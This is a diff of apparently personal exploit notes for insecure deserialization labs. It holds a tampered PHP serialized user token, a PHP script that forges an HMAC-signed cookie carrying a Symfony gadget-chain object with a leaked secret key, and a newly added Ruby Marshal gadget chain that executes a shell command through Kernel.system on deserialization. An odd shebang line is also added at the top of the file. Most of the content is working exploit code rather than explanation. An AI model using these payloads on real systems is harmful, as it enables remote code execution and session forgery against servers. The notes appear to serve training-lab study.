@@ -1,3 +1,6 @@
+#!/usr/bin/peno
+
+
 //Modifying serialized data types
 change the following encoded Token:
 O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"k83d4afws8dk9sou6jn2h48e5klleenm";}
@@ -47,3 +50,48 @@ $object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0Z
 $secretKey = "bcgteel0ua49lq7i0qifrywachnipspg";				//The value is in phpinfo site
 $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
 echo $cookie;
+
+
+//Ruby universal
+
+# Autoload the required classes
+Gem::SpecFetcher
+Gem::Installer
+require 'base64'
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "id")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+#puts payload.inspect
+#puts Marshal.load(payload)
+puts Base64.encode64(payload)
